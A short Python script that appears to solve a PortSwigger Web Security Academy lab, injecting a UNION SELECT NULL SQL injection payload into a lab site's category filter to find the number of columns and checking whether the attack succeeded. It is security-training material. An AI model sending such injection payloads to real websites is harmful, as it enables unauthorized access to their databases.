#https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
from utils import *

url="https://0a8a00b103e34b1e82ce607800fd0064.web-security-academy.net/"
n_cols=number_cols(url)
print(n_cols)
payload=f"filter?category=' union select NULL{',NULL'*(n_cols-1)}-- "
print(payload)
exploit=f"{url}{payload}"
response=requests.get(exploit)
soup=parse_html(response)
print(check_succes(soup))

